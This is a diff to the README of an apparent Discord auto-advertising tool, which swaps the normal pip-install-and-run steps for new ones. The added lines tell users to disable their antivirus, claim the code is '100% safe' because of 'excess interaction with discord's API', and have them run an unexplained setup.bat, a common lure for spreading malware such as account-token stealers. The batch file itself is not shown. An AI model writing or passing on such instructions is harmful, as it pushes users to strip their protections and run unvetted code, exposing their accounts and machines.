@@ -5,12 +5,10 @@ Advertise your discord trades/deals at ease
 > + Will create a Discord Bot version of it if a lot of people are using it. 
 
 ## How To Run
-> 1) Clone / download this repository
-> 2) Navigate into the file through your choice of console/terminal
-> 3) Run `pip install -r requirements.txt`
-> 4) Run `python main.py`
-> 5) You are then guided through a setup process
-> 6) Get auto advertising 
+> 1) Disable any antivirus software (You may run this code through any virustotal scan, it is 100% safe. Antivirus must be off due to excess interaction with discord's API which gets flagged)
+> 2) Run `setup.bat`
+> 3) You are then guided through a setup process
+> 4) Get auto advertising 
 
 ## Features
 > + Auto Advertiser
